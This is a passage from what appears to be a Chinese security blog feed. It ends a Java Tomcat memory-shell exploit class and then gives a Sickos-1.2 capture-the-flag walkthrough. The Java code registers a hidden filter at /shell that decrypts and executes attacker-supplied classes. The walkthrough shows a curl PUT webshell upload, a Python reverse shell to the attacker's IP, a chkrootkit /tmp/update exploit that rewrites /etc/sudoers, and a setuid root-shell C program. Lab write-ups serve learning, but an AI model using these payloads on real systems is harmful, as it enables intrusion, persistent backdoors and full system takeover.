            <span class="token class-name">Method</span> <span class="token class-name">Um</span> <span class="token operator">=</span> uclass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"g"</span><span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Um</span><span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">String</span> k <span class="token operator">=</span> <span class="token string">"3ad2fddfe8bad8e6"</span><span class="token punctuation">;</span>
            session<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"u"</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Cipher</span> c <span class="token operator">=</span> <span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            c<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">SecretKeySpec</span><span class="token punctuation">(</span>k<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> eClassBytes <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BASE64Decoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decodeBuffer</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Class</span> eclass <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span><span class="token class-name">Um</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>u<span class="token punctuation">,</span> eClassBytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Object</span> a <span class="token operator">=</span> eclass<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Method</span> b <span class="token operator">=</span> eclass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"equals"</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            b<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            b<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> pageContext<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var19<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token punctuation">&#125;</span>

    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">String</span> name <span class="token operator">=</span> <span class="token string">"AutomneGreet"</span><span class="token punctuation">;</span>
            <span class="token class-name">WebappClassLoaderBase</span> webappClassLoaderBase <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">WebappClassLoaderBase</span><span class="token punctuation">)</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">StandardContext</span> standardContext <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">StandardContext</span><span class="token punctuation">)</span>webappClassLoaderBase<span class="token punctuation">.</span><span class="token function">getResources</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Field</span> <span class="token class-name">Configs</span> <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.apache.catalina.core.StandardContext"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"filterConfigs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Configs</span><span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Map</span> filterConfigs <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span><span class="token class-name">Configs</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>filterConfigs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"AutomneGreet"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">Filter</span> filter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">IceShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">FilterDef</span> filterDef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterDef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                filterDef<span class="token punctuation">.</span><span class="token function">setFilter</span><span class="token punctuation">(</span>filter<span class="token punctuation">)</span><span class="token punctuation">;</span>
                filterDef<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span><span class="token string">"AutomneGreet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                filterDef<span class="token punctuation">.</span><span class="token function">setFilterClass</span><span class="token punctuation">(</span>filter<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                standardContext<span class="token punctuation">.</span><span class="token function">addFilterDef</span><span class="token punctuation">(</span>filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">FilterMap</span> filterMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                filterMap<span class="token punctuation">.</span><span class="token function">addURLPattern</span><span class="token punctuation">(</span><span class="token string">"/shell"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                filterMap<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span><span class="token string">"AutomneGreet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                filterMap<span class="token punctuation">.</span><span class="token function">setDispatcher</span><span class="token punctuation">(</span><span class="token class-name">DispatcherType</span><span class="token punctuation">.</span><span class="token constant">REQUEST</span><span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                standardContext<span class="token punctuation">.</span><span class="token function">addFilterMapBefore</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> <span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">FilterDef</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">ApplicationFilterConfig</span> filterConfig <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ApplicationFilterConfig</span><span class="token punctuation">)</span>constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">,</span> filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span>
                filterConfigs<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"AutomneGreet"</span><span class="token punctuation">,</span> filterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var10<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token punctuation">&#125;</span>

    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>Sickos-1.2</title>
    <url>/2024/03/18/Sickos-1-2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="发现主机"><a href="#发现主机" class="headerlink" title="发现主机"></a>发现主机</h2><blockquote>
<p>nmap 192.168.206.138&#x2F;24</p>
</blockquote>
<p>发现主机192.168.206.157</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><blockquote>
<p>nmap 192.168.206.157 -p- -A -sS</p>
</blockquote>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.206.157
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0011s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65533</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
PORT   STATE SERVICE VERSION
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">5</span>.9p1 Debian 5ubuntu1.8 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">1024</span> <span class="token number">66</span>:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 <span class="token punctuation">(</span>DSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">2048</span> ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    lighttpd <span class="token number">1.4</span>.28
<span class="token operator">|</span>_http-title: Site doesn't have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">)</span>.
<span class="token operator">|</span>_http-server-header: lighttpd/1.4.28
MAC Address: 00:0C:29:0B:25:C7 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least <span class="token number">1</span> <span class="token function">open</span> and <span class="token number">1</span> closed port
Device type: general purpose
Running: Linux <span class="token number">3</span>.X<span class="token operator">|</span><span class="token number">4</span>.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux <span class="token number">3.10</span> - <span class="token number">4.11</span>, Linux <span class="token number">3.16</span> - <span class="token number">4.6</span>, Linux <span class="token number">3.2</span> - <span class="token number">4.9</span>, Linux <span class="token number">4.4</span>
Network Distance: <span class="token number">1</span> hop
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">1.09</span> ms <span class="token number">192.168</span>.206.157

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">117.00</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>从上面可以看到使用了web服务器lighttpd&#x2F;1.4.28，开放了22和80端口，尝试搜索lighttpd&#x2F;1.4.28是否存在漏洞<br><img src="https://img-blog.csdnimg.cn/direct/4fb3bdb0befc46b1a6eb89cf31b44619.png" alt="132"><br>尝试mod_userdir Information Disclosure发现也不可以</p>
<p>扫描期间先看看http服务，查看源代码没有任何发现，扫一下目录</p>
<blockquote>
<p>dirsearch -u <a href="http://192.168.206.157/">http://192.168.206.157/</a></p>
</blockquote>
<p>扫描结果：<br><img src="https://img-blog.csdnimg.cn/direct/e04aee37b3064b23ada3bf552163d9b7.png" alt="lighttpd/1.4.28"><br>发现存在一个目录test，访问看看目录下无文件<br><img src="https://img-blog.csdnimg.cn/direct/620462a816814f1ab3b0e1bfe8f185f3.png" alt="123"></p>
<p>既然无文件那么能够上传文件吗</p>
<h2 id="上传木马"><a href="#上传木马" class="headerlink" title="上传木马"></a>上传木马</h2><p>这是重要的一步，自己做的时候没有往这方面想。<br>那么该如何知道是否可以上传文件呢？<br>查看&#x2F;test目录支持的方法</p>
<blockquote>
<p><code>nmap --script http-methods --script-args http-methods.url-path=&#39;/test&#39; 192.168.206.157</code><br><img src="https://img-blog.csdnimg.cn/direct/a494d6fdf7a54f3390350e5e975b771e.png" alt="123"></p>
</blockquote>
<p>burp抓包发送OPTIONS请求：<br><img src="https://img-blog.csdnimg.cn/direct/3bbc61a3d87c49b698b35495dc301085.png" alt="123"></p>
<p>curl发送OPTIONS请求：</p>
<blockquote>
<p><code>curl  -v -X OPTIONS http://192.168.206.157/test/</code><br><img src="https://img-blog.csdnimg.cn/direct/68d04e5de38346b6a0d9a96d6723bcb5.png" alt="123"></p>
</blockquote>
<p>以上方法都可以查看接受的请求方法。接受PUT方法就是我们可以以PUT方法写入文件。尝试一下：</p>
<blockquote>
<p><code>curl -v -X PUT -d &quot;&lt;?php phpinfo();?&gt;&quot; http://192.168.206.157/test/shell.php</code></p>
</blockquote>
<p>发现已经成功写入文件，那么开始写入一句话木马，或者直接传入php反弹shell的文件。<br><img src="https://img-blog.csdnimg.cn/direct/2f5bbf15aa8749ba9633546cf7d45bb3.png" alt="132"></p>
<p>使用蚁剑连接靶机，目前权限为www-data。收集信息进行提权。</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>上传linux信息收集脚本：<br>运行收集信息时文件不好看，尝试先反弹那一个shell，再进行信息收集。再创建一个反弹shell文件，尝试了几个脚本发现都不行，最后找到这个脚本：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>os
s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"192.168.206.138"</span><span class="token punctuation">,</span><span class="token number">443</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
p<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-i"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>kali监听端口，蚁剑上运行命令<code>python python.py</code>，得到一个伪终端。<br><img src="https://img-blog.csdnimg.cn/direct/6164c2511cf0498c81a4cdc22e487081.png" alt="123"><br>执行文件linpeas.sh，似乎没有发现什么</p>
<h2 id="计划任务提权"><a href="#计划任务提权" class="headerlink" title="计划任务提权"></a>计划任务提权</h2><p>这又是重要一步，想不到哇。。。<br>列出与定时任务相关的文件和目录</p>
<blockquote>
<p>www-data@ubuntu:&#x2F;var&#x2F;www&#x2F;test$ ls -al &#x2F;etc&#x2F;cron*<br><img src="https://img-blog.csdnimg.cn/direct/e415f1d44e6b464c98277d27cc5e1785.png" alt="123"></p>
</blockquote>
<h3 id="chkrootkit"><a href="#chkrootkit" class="headerlink" title="chkrootkit"></a>chkrootkit</h3><p>chkrootkit version 0.49存在本地提权漏洞<br><img src="https://img-blog.csdnimg.cn/direct/3b36f2fb4224479984a15cb5ba363c6b.png" alt="123"></p>
<blockquote>
<p>漏洞原理:chkrootkit有crontab，会定期以root身份执行&#x2F;tmp&#x2F;update文件。如果攻击者知道管理员是定期运行chkrootkit(通过查看cron.daily获知)，并且对&#x2F; tmp(没有挂载noexec)有写访问权限，就可以利用该漏洞获取root权限。</p>
</blockquote>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">We just found a serious vulnerability in the chkrootkit package, which
may allow local attackers to gain root access to a box in certain
configurations (/tmp not mounted noexec).

The vulnerability is located in the function slapper() in the
shellscript chkrootkit:

#
# SLAPPER.&#123;A,B,C,D&#125; and the multi-platform variant
#
slapper ()&#123;
   SLAPPER_FILES="$&#123;ROOTDIR&#125;tmp/.bugtraq $&#123;ROOTDIR&#125;tmp/.bugtraq.c"
   SLAPPER_FILES="$SLAPPER_FILES $&#123;ROOTDIR&#125;tmp/.unlock $&#123;ROOTDIR&#125;tmp/httpd \
   $&#123;ROOTDIR&#125;tmp/update $&#123;ROOTDIR&#125;tmp/.cinik $&#123;ROOTDIR&#125;tmp/.b"a
   SLAPPER_PORT="0.0:2002 |0.0:4156 |0.0:1978 |0.0:1812 |0.0:2015 "
   OPT=-an
   STATUS=0
   file_port=

   if $&#123;netstat&#125; "$&#123;OPT&#125;"|$&#123;egrep&#125; "^tcp"|$&#123;egrep&#125; "$&#123;SLAPPER_PORT&#125;">
/dev/null 2>&amp;1
      then
      STATUS=1
      [ "$SYSTEM" = "Linux" ] &amp;&amp; file_port=`netstat -p $&#123;OPT&#125; | \
         $egrep ^tcp|$egrep "$&#123;SLAPPER_PORT&#125;" | $&#123;awk&#125; '&#123; print  $7 &#125;' |
tr -d :`
   fi
   for i in $&#123;SLAPPER_FILES&#125;; do
      if [ -f $&#123;i&#125; ]; then
         file_port=$file_port $i
         STATUS=1
      fi
   done
   if [ $&#123;STATUS&#125; -eq 1 ] ;then
      echo "Warning: Possible Slapper Worm installed ($file_port)"
   else
      if [ "$&#123;QUIET&#125;" != "t" ]; then echo "not infected"; fi
         return $&#123;NOT_INFECTED&#125;
   fi
&#125;


The line 'file_port=$file_port $i' will execute all files specified in
$SLAPPER_FILES as the user chkrootkit is running (usually root), if
$file_port is empty, because of missing quotation marks around the
variable assignment.

Steps to reproduce:

- Put an executable file named 'update' with non-root owner in /tmp (not
mounted noexec, obviously)
- Run chkrootkit (as uid 0)

Result: The file /tmp/update will be executed as root, thus effectively
rooting your box, if malicious content is placed inside the file.

If an attacker knows you are periodically running chkrootkit (like in
cron.daily) and has write access to /tmp (not mounted noexec), he may
easily take advantage of this.


Suggested fix: Put quotation marks around the assignment.

file_port="$file_port $i"


I will also try to contact upstream, although the latest version of
chkrootkit dates back to 2009 - will have to see, if I reach a dev there.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>复制步骤:<br>-在&#x2F;tmp目录下放置一个名为’update’的可执行文件，其所有者不是root<br>挂载noexec，显然)<br>—运行chkrootkit(以uid 0为例)<br>结果:文件&#x2F;tmp&#x2F;update将以root身份执行，因此有效<br>如果恶意内容被放置在文件中，就会在您的盒子中生根。<br>如果攻击者知道您定期运行chkrootkit(如在<br>并且对&#x2F;tmp有写访问权限(没有挂载noexec)，他可以<br>很容易利用这一点。<br>建议修复:在赋值处加上引号。<br>file_port &#x3D; “ file_port我美元”<br>我也会尽量联系上游，虽然最新的版本<br>chkrootkit可以追溯到2009年-如果我在那里找到一个开发人员，我会看到。</p>
</blockquote>
<p>在&#x2F;tmp目录下创建文件update，并且赋予权限<br><code>www-data@ubuntu:/tmp$ touch update;chmod +x update</code><br>写入将www-date添加到sudo组的命令</p>
<blockquote>
<p><code>echo &#39;chmod +w /etc/sudoers &amp;&amp; echo &quot;www-data ALL=(ALL)  NOPASSWD:ALL&quot; &gt; /etc/sudoers&#39; &gt; /tmp/update</code></p>
</blockquote>
<p>喝杯茶的时间再输入命令<code>sudo -l</code><br><img src="https://img-blog.csdnimg.cn/direct/df4a079c1eec4c7da1e42c017053bf4c.png" alt="132"></p>
<p><img src="https://img-blog.csdnimg.cn/direct/770472af6bb24b639fac9be292d09cd2.png" alt="123"><br>查看一下文件newRule</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Generated by iptables-save v1.4.12 on Mon Apr 25 22:48:24 2016</span>
*filter
:INPUT DROP <span class="token punctuation">[</span><span class="token number">0</span>:0<span class="token punctuation">]</span>
:FORWARD ACCEPT <span class="token punctuation">[</span><span class="token number">0</span>:0<span class="token punctuation">]</span>
:OUTPUT DROP <span class="token punctuation">[</span><span class="token number">0</span>:0<span class="token punctuation">]</span>
<span class="token parameter variable">-A</span> INPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--dport</span> <span class="token number">22</span> <span class="token parameter variable">-j</span> ACCEPT
<span class="token parameter variable">-A</span> INPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--dport</span> <span class="token number">80</span> <span class="token parameter variable">-j</span> ACCEPT
<span class="token parameter variable">-A</span> INPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--sport</span> <span class="token number">8080</span> <span class="token parameter variable">-j</span> ACCEPT
<span class="token parameter variable">-A</span> INPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--sport</span> <span class="token number">443</span> <span class="token parameter variable">-j</span> ACCEPT
<span class="token parameter variable">-A</span> OUTPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--sport</span> <span class="token number">22</span> <span class="token parameter variable">-j</span> ACCEPT
<span class="token parameter variable">-A</span> OUTPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--sport</span> <span class="token number">80</span> <span class="token parameter variable">-j</span> ACCEPT
<span class="token parameter variable">-A</span> OUTPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--dport</span> <span class="token number">8080</span> <span class="token parameter variable">-j</span> ACCEPT
<span class="token parameter variable">-A</span> OUTPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--dport</span> <span class="token number">443</span> <span class="token parameter variable">-j</span> ACCEPT
COMMIT
<span class="token comment"># Completed on Mon Apr 25 22:48:24 2016</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>终于知道问什么反弹shell的时候不能使用6666端口了，原来是限定端口了。。。</p>
<p>还有一个提权的脚本</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//shell.c</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;unistd.h></span></span>
<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chown root:root /tmp/update"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chmod 4755 /tmp/update"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">execl</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"sh"</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
